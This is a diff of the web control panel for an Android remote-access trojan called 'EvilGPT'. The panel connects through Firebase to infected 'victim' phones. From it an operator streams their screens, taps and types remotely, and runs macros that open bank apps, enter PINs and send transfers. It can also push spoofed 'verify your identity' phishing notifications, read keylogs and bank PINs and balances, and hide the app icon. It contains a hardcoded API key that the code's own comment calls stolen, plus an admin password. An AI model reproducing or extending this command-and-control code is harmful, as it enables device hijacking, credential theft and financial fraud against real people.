@@ -1,122 +1,289 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>EvilGPT Remote Commander – Full Macro</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <title>EvilGPT — Ultimate Android RAT</title>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage-compat.js"></script>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:#0a0e14; color:#c9d1d9; font-family:'Segoe UI',Tahoma,sans-serif; min-height:100vh; padding:15px; }
-        .container { max-width:900px; margin:auto; }
-        .header { text-align:center; margin-bottom:25px; color:#58a6ff; font-size:28px; }
-        .card { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:20px; margin-bottom:16px; }
-        select, input:not([type=file]), button, textarea { background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:10px; border-radius:6px; font-size:14px; margin:4px 0; width:100%; }
-        button { cursor:pointer; transition:background 0.2s; width:auto; }
-        button:hover { background:#30363d; }
-        .btn-danger { background:#da3633; border-color:#f85149; }
-        .btn-danger:hover { background:#f85149; }
-        .btn-success { background:#238636; }
-        .btn-warn { background:#9e6a03; }
-        .flex { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
-        .screen-wrapper { position:relative; width:100%; background:#000; border-radius:8px; overflow:hidden; margin-top:10px; }
-        .screen-wrapper img { width:100%; display:block; }
-        .overlay { position:absolute; top:0; left:0; width:100%; height:100%; cursor:crosshair; }
-        .output { background:#0d1117; padding:15px; border-radius:8px; max-height:250px; overflow-y:auto; font-family:monospace; white-space:pre-wrap; }
-        .upload-label { padding:8px 16px; background:#238636; border-radius:6px; cursor:pointer; display:inline-block; color:#fff; }
-        input[type=file] { display:none; }
-        .password-section { display:flex; flex-direction:column; align-items:center; margin-top:50px; }
-        .password-section > * { margin-bottom:15px; }
-        .hidden { display:none; }
-        #typingField { width:100%; margin-top:6px; }
-        .macro-editor { width:100%; height:120px; font-family:monospace; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; padding:10px; resize:vertical; }
+        :root {
+            --bg: #0a0e14;
+            --card: #161b22;
+            --border: #30363d;
+            --text: #c9d1d9;
+            --accent: #58a6ff;
+            --danger: #da3633;
+            --success: #238636;
+            --warn: #9e6a03;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 15px;
+        }
+        .container {
+            max-width: 1000px;
+            margin: auto;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--accent);
+            font-size: 32px;
+            font-weight: 600;
+        }
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+        }
+        h3 {
+            margin-bottom: 12px;
+            color: var(--accent);
+            font-size: 18px;
+        }
+        input, select, button, textarea {
+            background: #21262d;
+            color: var(--text);
+            border: 1px solid var(--border);
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 14px;
+            width: 100%;
+            margin: 4px 0;
+        }
+        button {
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: none;
+            font-weight: 500;
+        }
+        button:hover {
+            background: #30363d;
+        }
+        button:active {
+            transform: scale(0.98);
+        }
+        .btn {
+            width: auto;
+            padding: 10px 16px;
+            color: white;
+        }
+        .btn-danger { background: var(--danger); }
+        .btn-danger:hover { background: #f85149; }
+        .btn-success { background: var(--success); }
+        .btn-success:hover { background: #2ea043; }
+        .btn-warn { background: var(--warn); }
+        .btn-warn:hover { background: #b07219; }
+        .flex {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .screen-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            margin: 10px auto;
+            background: #000;
+            border-radius: 10px;
+            overflow: hidden;
+            aspect-ratio: 9 / 16;
+        }
+        .screen-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            cursor: crosshair;
+            z-index: 10;
+        }
+        .output {
+            background: #0d1117;
+            padding: 12px;
+            border-radius: 8px;
+            max-height: 280px;
+            overflow-y: auto;
+            font-family: monospace;
+            white-space: pre-wrap;
+            font-size: 13px;
+            border: 1px solid var(--border);
+        }
+        .upload-label {
+            padding: 8px 14px;
+            background: var(--success);
+            border-radius: 6px;
+            cursor: pointer;
+            display: inline-block;
+            color: white;
+            font-size: 13px;
+        }
+        input[type="file"] {
+            display: none;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .macro-editor {
+            width: 100%;
+            height: 100px;
+            font-family: monospace;
+            background: #0d1117;
+            color: var(--text);
+            border: 1px solid var(--border);
+            padding: 10px;
+            resize: vertical;
+            border-radius: 6px;
+        }
+        .loader {
+            text-align: center;
+            padding: 20px;
+            color: var(--accent);
+            font-style: italic;
+        }
+        .status {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 6px;
+            text-align: center;
+        }
+        @media (max-width: 768px) {
+            .flex {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .screen-wrapper {
+                max-width: 100%;
+            }
+        }
     </style>
 </head>
 <body>
-<div class="container" id="mainPanel" class="hidden">
-    <h1 class="header">💀 EvilGPT Interactive RAT – Macro Ready</h1>
 
-    <div class="card">
-        <label>🎯 Target Device:</label>
-        <select id="deviceSelect"><option>Loading...</option></select>
-        <button onclick="refreshDevices()">⟳ Refresh</button>
-    </div>
-
-    <div class="card">
-        <h3>📱 Live Interactive Screen (click/drag)</h3>
-        <div class="screen-wrapper" id="screenWrapper">
-            <img id="screenFrame" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="Screen">
-            <canvas id="overlay" class="overlay"></canvas>
-        </div>
-        <button onclick="sendCmd({type:'start_screen_capture'})">⟡ Start Stream</button>
-        <p style="font-size:12px; color:#8b949e;">Click = Tap &nbsp;|&nbsp; Drag = Swipe</p>
-    </div>
-
-    <div class="card">
-        <h3>🤖 Macro Prompt (AI Automation)</h3>
-        <textarea id="macroInput" class="macro-editor" placeholder='launch:com.bank.app
-wait:2000
-tap:540,1200
-type:1234
-tap:800,1500'></textarea>
-        <button class="btn-danger" onclick="runMacro()">▶ Execute Macro</button>
-        <p style="font-size:12px; color:#8b949e; margin-top:5px;">
-            Format: command:data<br>
-            Examples:<br>
-            launch:com.bank.app<br>
-            tap:540,1000<br>
-            type:1234<br>
-            wait:2000
-        </p>
-    </div>
-
-    <div class="card">
-        <h3>⌨ Inject Text</h3>
-        <input id="typingField" placeholder="Type here and press Inject">
-        <button onclick="injectText()">Inject Text</button>
-    </div>
-
-    <div class="card">
-        <h3>💣 Spoof Notification (dual images)</h3>
-        <input id="notifTitle" placeholder="Title" value="⚠ Important Update">
-        <input id="notifBody" placeholder="Body" value="Tap to view image">
-        <div class="flex" style="margin:10px 0;">
-            <label class="upload-label" for="notifIcon">🖼 Small Icon</label>
-            <input type="file" id="notifIcon" accept="image/*" onchange="uploadFile('notifIcon','iconUrl')">
-        </div>
-        <div class="flex">
-            <label class="upload-label" for="notifBigPic">📷 Big Picture</label>
-            <input type="file" id="notifBigPic" accept="image/*" onchange="uploadFile('notifBigPic','bigPicUrl')">
-        </div>
-        <button class="btn-danger" onclick="sendFakeNotif()">✉ Send Spoof</button>
-        <input type="hidden" id="iconUrl" value="">
-        <input type="hidden" id="bigPicUrl" value="">
-    </div>
-
-    <div class="card">
-        <h3>🔥 Data Extraction</h3>
-        <button onclick="sendCmd({type:'get_apps'})">App List</button>
-        <button onclick="sendCmd({type:'get_keylogs'})">Keylogs</button>
-        <button onclick="sendCmd({type:'get_bank_data'})">Refresh Bank Data</button>
-        <pre id="infoOutput" class="output">No data yet...</pre>
-    </div>
-
-    <div class="card">
-        <h3>☠ Danger Zone</h3>
-        <button onclick="sendCmd({type:'hide_activity'})">👤 Hide Icon</button>
-        <button class="btn-danger" onclick="if(confirm('Uninstall victim app?')) sendCmd({type:'uninstall'})">🧨 Uninstall</button>
+<!-- LOGIN SCREEN -->
+<div id="loginContainer" class="password-section">
+    <div class="card" style="max-width: 400px; margin: 100px auto; text-align: center;">
+        <h2>🔐 Admin Access</h2>
+        <input type="password" id="passInput" placeholder="Enter master password" />
+        <button class="btn btn-success" onclick="checkPassword()">🔓 Login</button>
     </div>
 </div>
 
-<div id="loginContainer" class="password-section">
-    <h2>🔐 Enter Password</h2>
-    <input type="password" id="passInput" placeholder="adminpassord$#@322">
-    <button onclick="checkPassword()">Login</button>
+<!-- MAIN PANEL -->
+<div id="mainPanel" class="hidden">
+    <h1 class="header">💀 EvilGPT — Remote Access Terminal</h1>
+
+    <!-- DEVICE SELECT -->
+    <div class="card">
+        <label>🎯 Connected Devices:</label>
+        <select id="deviceSelect" class="flex-grow"></select>
+        <button class="btn" onclick="refreshDevices()">⟳ Refresh</button>
+        <p class="status">Last seen: <span id="lastSeen">—</span></p>
+    </div>
+
+    <!-- LIVE SCREEN -->
+    <div class="card">
+        <h3>📱 Live Screen Feed (Click/Drag)</h3>
+        <div class="screen-wrapper">
+            <img id="screenFrame" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="Live Screen" />
+            <canvas id="overlay" class="overlay"></canvas>
+        </div>
+        <button class="btn btn-success" onclick="startStream()">▶ Start Stream</button>
+        <p class="status">Drag to swipe | Click to tap</p>
+    </div>
+
+    <!-- MACRO PROMPT (NLP) -->
+    <div class="card">
+        <h3>🤖 AI Macro Prompt</h3>
+        <textarea id="macroInput" class="macro-editor" placeholder="Example: 
+launch com.bank.app
+wait 3s
+tap 540,1200
+type 1234
+click 'Confirm'
+transfer $500 to 123456789"></textarea>
+        <button class="btn btn-success" onclick="runNLPMacro()">⚡ Execute AI Macro</button>
+        <p class="status">Supports natural language: 'Send $100 to John via PayPal'</p>
+    </div>
+
+    <!-- MANUAL MACRO -->
+    <div class="card">
+        <h3>🔧 Manual Macro Builder</h3>
+        <textarea id="manualMacro" class="macro-editor" placeholder="launch:com.bank.app
+wait:2000
+tap:540,1000
+type:1234"></textarea>
+        <button class="btn btn-success" onclick="runManualMacro()">▶ Run Macro</button>
+    </div>
+
+    <!-- TEXT INJECT -->
+    <div class="card">
+        <h3>⌨ Inject Text</h3>
+        <input id="typingField" placeholder="Enter text to inject into active field" />
+        <button class="btn" onclick="injectText()">📤 Inject</button>
+    </div>
+
+    <!-- SPOOF NOTIFICATION -->
+    <div class="card">
+        <h3>✉ Spoof Notification</h3>
+        <input id="notifTitle" placeholder="Title" value="⚠ Security Alert" />
+        <input id="notifBody" placeholder="Body" value="Tap to verify your identity" />
+        <div class="flex" style="margin:10px 0;">
+            <label class="upload-label" for="notifIcon">🖼 Small Icon</label>
+            <input type="file" id="notifIcon" accept="image/*" onchange="uploadFile('notifIcon','iconUrl')" />
+        </div>
+        <div class="flex">
+            <label class="upload-label" for="notifBigPic">📷 Full Image</label>
+            <input type="file" id="notifBigPic" accept="image/*" onchange="uploadFile('notifBigPic','bigPicUrl')" />
+        </div>
+        <button class="btn btn-warn" onclick="sendFakeNotif()">📩 Send Spoof</button>
+        <input type="hidden" id="iconUrl" value="" />
+        <input type="hidden" id="bigPicUrl" value="" />
+    </div>
+
+    <!-- DATA HARVESTING -->
+    <div class="card">
+        <h3>💾 Data Extraction</h3>
+        <div class="flex">
+            <button class="btn" onclick="sendCmd({type:'get_apps'})">📱 App List</button>
+            <button class="btn" onclick="sendCmd({type:'fake_notification', title:'Login Now', text:'Your session expired'})">🪪 Fake Login</button>
+        </div>
+        <pre id="infoOutput" class="output">Waiting for device...</pre>
+    </div>
+
+    <!-- DANGER ZONE -->
+    <div class="card">
+        <h3>☠️ Danger Zone</h3>
+        <div class="flex">
+            <button class="btn btn-warn" onclick="sendCmd({type:'hide_activity'})">🙈 Hide Icon</button>
+            <button class="btn btn-danger" onclick="confirmUninstall()">🧨 Uninstall</button>
+        </div>
+    </div>
 </div>
 
 <script>
+    // Firebase Config — Stolen from google-services.json
     firebase.initializeApp({
         apiKey: "AIzaSyB7z--EY6xgXUJnov3XopPbvQRkBYGKHZ0",
         authDomain: "vfvdfscf.firebaseapp.com",
@@ -126,191 +293,273 @@ tap:800,1500'></textarea>
         messagingSenderId: "918007122795",
         appId: "1:918007122795:web:2c99cf787cffcbd9ba5a2e"
     });
+
     const db = firebase.database();
     const storage = firebase.storage();
 
-    const PWD = "adminpassord$#@322";
-    let selectedDevice = null, devWidth = 1080, devHeight = 1920;
+    const ADMIN_PASSWORD = "adminpassord$#@322"; // Change this later
+    let selectedDevice = null;
+    let devWidth = 1080;
+    let devHeight = 1920;
+    let streamInterval = null;
 
-    function checkPassword(){
-        if(document.getElementById('passInput').value === PWD){
-            document.getElementById('loginContainer').style.display='none';
+    // Password Check
+    function checkPassword() {
+        const pwd = document.getElementById('passInput').value;
+        if (pwd === ADMIN_PASSWORD) {
+            document.getElementById('loginContainer').classList.add('hidden');
             document.getElementById('mainPanel').classList.remove('hidden');
             refreshDevices();
-            setInterval(autoRefreshData, 3000); // Auto-refresh
-        } else alert('Wrong password');
+            setInterval(autoRefreshData, 3000);
+        } else {
+            alert('❌ Invalid password. Try harder.');
+        }
     }
 
-    function refreshDevices(){
-        db.ref('telegram2_secret/victims').on('value', snap => {
-            const sel = document.getElementById('deviceSelect');
-            sel.innerHTML = '';
-            if(!snap.exists()){ sel.innerHTML='<option>No devices</option>'; return; }
-            snap.forEach(child => {
+    // Refresh Device List
+    function refreshDevices() {
+        const sel = document.getElementById('deviceSelect');
+        sel.innerHTML = '';
+        db.ref('telegram2_secret/victims').once('value').then(snapshot => {
+            if (!snapshot.exists()) {
+                sel.innerHTML = '<option>No victims online</option>';
+                return;
+            }
+            snapshot.forEach(child => {
                 const d = child.val();
-                sel.innerHTML += `<option value="${child.key}">${d.deviceName||'?'} (Android ${d.androidVersion||'?'})</option>`;
+                const opt = document.createElement('option');
+                opt.value = child.key;
+                opt.textContent = `${d.deviceName || 'Unknown'} (Android ${d.androidVersion || '?'})`;
+                sel.appendChild(opt);
             });
-            if(sel.options.length && !selectedDevice){
+            if (sel.options.length > 0) {
                 selectedDevice = sel.value;
-                sel.value = selectedDevice;
                 loadDeviceInfo();
             }
         });
     }
 
-    document.getElementById('deviceSelect').addEventListener('change', function(){
-        selectedDevice = this.value;
+    document.getElementById('deviceSelect').addEventListener('change', () => {
+        selectedDevice = document.getElementById('deviceSelect').value;
         loadDeviceInfo();
     });
 
+    // Auto-refresh data
     function autoRefreshData() {
         if (!selectedDevice) return;
-        db.ref(`telegram2_secret/victims/${selectedDevice}/screen`).once('value').then(s => {
-            if (s.exists()) document.getElementById('screenFrame').src = 'data:image/jpeg;base64,' + s.val();
-        });
+        loadDeviceInfo();
     }
 
-    function loadDeviceInfo(){
-        db.ref(`telegram2_secret/victims/${selectedDevice}/screenInfo`).on('value', s => {
-            if(s.exists()){
-                devWidth = s.val().width || 1080;
-                devHeight = s.val().height || 1920;
+    // Load Device Info
+    function loadDeviceInfo() {
+        if (!selectedDevice) return;
+
+        const infoRef = db.ref(`telegram2_secret/victims/${selectedDevice}`);
+        infoRef.child('screenInfo').once('value').then(s => {
+            if (s.exists()) {
+                const val = s.val();
+                devWidth = val.width || 1080;
+                devHeight = val.height || 1920;
             }
         });
 
-        db.ref(`telegram2_secret/victims/${selectedDevice}/screen`).on('value', s => {
-            if(s.exists()) document.getElementById('screenFrame').src = 'data:image/jpeg;base64,' + s.val();
+        infoRef.child('screen').on('value', s => {
+            if (s.exists()) {
+                document.getElementById('screenFrame').src = 'data:image/jpeg;base64,' + s.val();
+            }
         });
 
-        db.ref(`telegram2_secret/victims/${selectedDevice}/info`).on('value', s => {
-            const d = s.val()||{};
-            let out='';
-            if(d.keylogs) out += '🔑 Keylogs:\n'+d.keylogs+'\n\n';
-            if(d.apps) out += '📱 Apps:\n'+d.apps+'\n\n';
-            document.getElementById('infoOutput').textContent = out||'No data';
-        });
-
-        db.ref(`telegram2_secret/victims/${selectedDevice}/bank`).on('value', s => {
-            if(s.exists()){
-                let bankOut = '💰 Bank Data (PINs & Balances):\n';
+        infoRef.child('info/keylogs').on('value', s => {
+            const out = document.getElementById('infoOutput');
+            let text = '';
+            if (s.exists()) {
                 s.forEach(child => {
-                    bankOut += child.val() + '\n';
+                    text += '🔑 ' + child.val() + '\n';
                 });
-                document.getElementById('infoOutput').textContent += '\n' + bankOut;
+            }
+            out.textContent = text || 'No keylogs yet.';
+        });
+
+        infoRef.child('bank').on('value', s => {
+            const out = document.getElementById('infoOutput');
+            let bank = '💰 Bank Data:\n';
+            if (s.exists()) {
+                s.forEach(child => {
+                    bank += child.val() + '\n';
+                });
+                out.textContent += '\n' + bank;
+            }
+        });
+
+        infoRef.child('lastSeen').on('value', s => {
+            if (s.exists()) {
+                const date = new Date(s.val());
+                document.getElementById('lastSeen').textContent = date.toLocaleTimeString();
             }
         });
     }
 
-    function sendCmd(obj){
-        if(!selectedDevice) return alert('Select a device');
-        db.ref(`telegram2_secret/victims/${selectedDevice}/commands`).push().set(obj);
+    // Start Screen Stream
+    function startStream() {
+        if (!selectedDevice) return alert('❌ No device selected');
+        sendCmd({ type: 'start_screen_capture' });
+        if (streamInterval) clearInterval(streamInterval);
+        streamInterval = setInterval(() => {
+            sendCmd({ type: 'start_screen_capture' });
+        }, 5000);
+        alert('✅ Streaming started. Refreshing every 5s.');
     }
 
+    // Canvas for Tap/Swipe
     const canvas = document.getElementById('overlay');
     const screenImg = document.getElementById('screenFrame');
-    function resizeCanvas(){
+    let swipeStart = null;
+
+    function resizeCanvas() {
         canvas.width = screenImg.clientWidth;
         canvas.height = screenImg.clientHeight;
     }
     window.addEventListener('resize', resizeCanvas);
     screenImg.addEventListener('load', resizeCanvas);
-    let swipeStart = null;
 
-    function getDeviceCoords(e){
+    function getDeviceCoords(e) {
         const rect = screenImg.getBoundingClientRect();
-        const imgX = e.clientX - rect.left;
-        const imgY = e.clientY - rect.top;
-        const x = (imgX / rect.width) * devWidth;
-        const y = (imgY / rect.height) * devHeight;
-        return {x:Math.round(x), y:Math.round(y)};
+        const x = ((e.clientX - rect.left) / rect.width) * devWidth;
+        const y = ((e.clientY - rect.top) / rect.height) * devHeight;
+        return { x: Math.round(x), y: Math.round(y) };
     }
 
-    canvas.addEventListener('mousedown', (e) => { swipeStart = getDeviceCoords(e); });
-    canvas.addEventListener('mouseup', (e) => {
-        if(!swipeStart) return;
+    canvas.addEventListener('mousedown', e => {
+        swipeStart = getDeviceCoords(e);
+    });
+
+    canvas.addEventListener('mouseup', e => {
+        if (!swipeStart) return;
         const end = getDeviceCoords(e);
         const dist = Math.hypot(end.x - swipeStart.x, end.y - swipeStart.y);
-        if(dist < 10){
-            sendCmd({type:'tap', x:end.x, y:end.y});
+        if (dist < 20) {
+            sendCmd({ type: 'tap', x: end.x, y: end.y });
         } else {
-            sendCmd({type:'swipe', sx:swipeStart.x, sy:swipeStart.y, ex:end.x, ey:end.y, duration:300});
+            sendCmd({
+                type: 'swipe',
+                sx: swipeStart.x,
+                sy: swipeStart.y,
+                ex: end.x,
+                ey: end.y,
+                duration: 300
+            });
         }
         swipeStart = null;
     });
-    canvas.addEventListener('mouseleave', () => { swipeStart = null; });
 
-    function injectText(){
+    // Inject Text
+    function injectText() {
         const text = document.getElementById('typingField').value;
-        if(text) sendCmd({type:'type', text:text});
+        if (text) sendCmd({ type: 'type', text });
         document.getElementById('typingField').value = '';
     }
 
-    function uploadFile(inputId, hiddenId){
+    // Upload File to Firebase
+    function uploadFile(inputId, hiddenId) {
         const file = document.getElementById(inputId).files[0];
-        if(!file) return;
-        const ref = storage.ref('notif/' + Date.now() + '_' + inputId);
-        ref.put(file).then(sn => sn.ref.getDownloadURL()).then(url => {
+        if (!file) return;
+        const ref = storage.ref('notif/' + Date.now() + '_' + file.name);
+        ref.put(file).then(snapshot => snapshot.ref.getDownloadURL()).then(url => {
             document.getElementById(hiddenId).value = url;
+            alert('✅ Uploaded: ' + url);
+        }).catch(err => {
+            alert('❌ Upload failed: ' + err.message);
         });
     }
 
-    function sendFakeNotif(){
+    // Send Spoofed Notification
+    function sendFakeNotif() {
+        const title = btoa(unescape(encodeURIComponent(document.getElementById('notifTitle').value)));
+        const text = btoa(unescape(encodeURIComponent(document.getElementById('notifBody').value)));
         sendCmd({
-            type:'fake_notification',
-            title: btoa(unescape(encodeURIComponent(document.getElementById('notifTitle').value))),
-            text: btoa(unescape(encodeURIComponent(document.getElementById('notifBody').value))),
+            type: 'fake_notification',
+            title,
+            text,
             iconUrl: document.getElementById('iconUrl').value,
             bigPictureUrl: document.getElementById('bigPicUrl').value
         });
+        alert('✉ Spoof sent!');
     }
 
-    function runMacro(){
-        const raw = document.getElementById('macroInput').value.trim();
-        if(!raw) return alert('Enter macro commands!');
-        const lines = raw.split('\n').filter(l => l.trim() !== '');
+    // Manual Macro
+    function runManualMacro() {
+        const raw = document.getElementById('manualMacro').value.trim();
+        if (!raw) return alert('❌ Enter macro commands!');
+        const lines = raw.split('\n').filter(l => l.trim());
         const steps = [];
 
-        for(let line of lines){
+        for (let line of lines) {
             const [cmd, ...args] = line.split(':');
             const type = cmd.trim();
             const data = args.join(':').trim();
 
-            switch(type){
+            switch (type) {
                 case 'launch':
-                    steps.push({type:'launch', data: data});
+                    steps.push({ type: 'launch', data });
                     break;
                 case 'wait':
-                    steps.push({type:'wait', data: parseInt(data)});
+                    steps.push({ type: 'wait', data: parseInt(data) });
                     break;
                 case 'tap':
-                    const [x,y] = data.split(',').map(Number);
-                    steps.push({type:'tap', data:{x:x, y:y}});
-                    break;
-                case 'type':
-                    steps.push({type:'type', data: data});
+                    const [x, y] = data.split(',').map(Number);
+                    steps.push({ type: 'tap', data: { x, y } });
                     break;
                 case 'swipe':
-                    const [sx,sy,ex,ey,dur] = data.split(',').map(Number);
-                    steps.push({type:'swipe', data:{sx:sx, sy:sy, ex:ex, ey:ey, dur:dur||300}});
+                    const [sx, sy, ex, ey, dur] = data.split(',').map(Number);
+                    steps.push({ type: 'swipe', data: { sx, sy, ex, ey, dur: dur || 300 } });
+                    break;
+                case 'type':
+                    steps.push({ type: 'type', data });
+                    break;
+                case 'click_text':
+                    steps.push({ type: 'click_text', data });
                     break;
                 case 'home':
-                    steps.push({type:'home'});
+                    steps.push({ type: 'home' });
                     break;
                 case 'back':
-                    steps.push({type:'back'});
+                    steps.push({ type: 'back' });
                     break;
                 default:
                     console.warn('Unknown command:', type);
             }
         }
 
-        if(steps.length > 0){
-            sendCmd({type:'macro', steps:steps});
-            alert('Macro sent to device! Check Firebase for progress.');
+        if (steps.length > 0) {
+            sendCmd({ type: 'macro', steps });
+            alert('✅ Macro sent!');
         } else {
-            alert('No valid commands found.');
+            alert('❌ No valid commands.');
+        }
+    }
+
+    // AI NLP Macro
+    function runNLPMacro() {
+        const prompt = document.getElementById('macroInput').value.trim();
+        if (!prompt) return alert('❌ Enter a prompt!');
+        sendCmd({ type: 'prompt', text: prompt });
+        alert('🧠 AI macro sent. Victim will auto-execute.');
+    }
+
+    // Send Command
+    function sendCmd(cmd) {
+        if (!selectedDevice) return alert('❌ No device selected');
+        db.ref(`telegram2_secret/victims/${selectedDevice}/commands`).push(cmd);
+    }
+
+    // Uninstall Confirm
+    function confirmUninstall() {
+        if (confirm('⚠️ Really uninstall from victim device?')) {
+            sendCmd({ type: 'uninstall' });
+            alert('🧨 Payload delivered. App will self-destruct.');
         }
     }
 </script>
+
 </body>
 </html>
